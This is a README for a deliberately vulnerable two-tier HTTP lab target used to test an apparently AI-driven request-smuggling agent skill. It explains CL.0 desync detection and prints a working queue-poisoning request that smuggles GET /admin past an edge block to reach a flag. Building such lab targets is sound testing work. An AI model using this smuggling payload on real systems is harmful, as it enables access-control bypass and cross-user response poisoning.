# CL.0 Request Smuggling — Guinea Pig (end-to-end validation target)

A deliberately vulnerable **CL.0** two-tier HTTP stack, used to validate the CL.0 /
0.CL leg of the RedAmon `http_request_smuggling` agent skill (class 2).

```
   client ──▶  streaming EDGE  ──(pooled keep-alive)──▶  BACKEND origin
              :9094 (80)                                 :9095 (5000)
              Content-Length framing                     CL.0: /health, /static, /assets
              blocks /admin at the edge                  answer WITHOUT reading the body
```

Unlike CL.TE, there is **no `Transfer-Encoding` header to probe** — the request
looks ordinary. The desync is CL.0: the edge reads `Content-Length` and forwards the
body, but the backend answers a set of **server-generated endpoints without reading
the body** (`/health`, `/static/*`, `/favicon.ico`, `/robots.txt`, `/assets`). Those
unread body bytes are parsed as the start of the next request on the pooled
front→back socket, so a request smuggled inside a CL.0 carrier body reaches the
backend. `/admin` is blocked at the edge, so the flag is only reachable by smuggling.

## Detection: the paused-request oracle
The edge **streams** (forwards headers before the body), so the oracle works through
it: send headers with a `Content-Length` promising a body, then pause.
- `/health` (CL.0) answers **early** (200) without the body → CL.0 candidate.
- `/submit` (normal) **waits** for the promised body → normal framing.

## Endpoints

| URL | Result |
| --- | --- |
| `http://<edge>/` | 200 landing (stamped `Via: 1.1 redamon-edge`) |
| `http://<edge>/admin` | **403** — blocked at the edge |
| `http://<edge>/health` | 200 without reading the body (CL.0) |
| `http://<backend-direct>/admin` | 200 + FLAG (distinct backend `X-Backend-Server: files-api`) |

Flag: `REDAMON_HRS{cl_0_desync_body_ignored_by_backend}`

## Run

```bash
docker compose up -d --build
python3 tests/verify_cl0.py          # paused oracle + queue-poison exploit
```

## Point RedAmon at it

```bash
docker network connect redamon-network cl0-guinea-edge
docker network connect redamon-network cl0-guinea-backend
```

Then create a project with **target = `http://cl0-guinea-edge`**, enable the
**HTTP Request Smuggling / Desync** agent skill (OFF by default), and ask the agent
in chat to test the edge for a CL.0 / 0.CL desync and reach the edge-blocked
`/admin`.

## The exploit (CL.0 queue poisoning)

```
POST /health HTTP/1.1        <-- CL.0 carrier: backend answers without reading body
Host: x
Content-Length: 34
Connection: keep-alive

GET /admin HTTP/1.1          <-- smuggled; stays in the backend buffer as request 2
Host: x

```

The edge forwards the carrier + body to the pooled backend socket; the backend
answers `/health` without consuming the body, so `GET /admin` is parsed as the next
request and its response is queued. A follow-up request on a **separate** client
connection (sharing the poisoned front→back socket) receives the smuggled `/admin`
response — which also rules out an intra-connection pipelining false positive.

## Files

| File | Role |
| --- | --- |
| `frontend/proxy.py` | streaming CL edge; blocks `/admin`; pools one upstream |
| `backend/app.py` | origin with CL.0 (body-ignoring) endpoints; serves the flag at `/admin` |
| `docker-compose.yml` | edge `:9094`, direct backend `:9095` |
| `tests/verify_cl0.py` | self-check: paused-oracle differential + CL.0 smuggle |
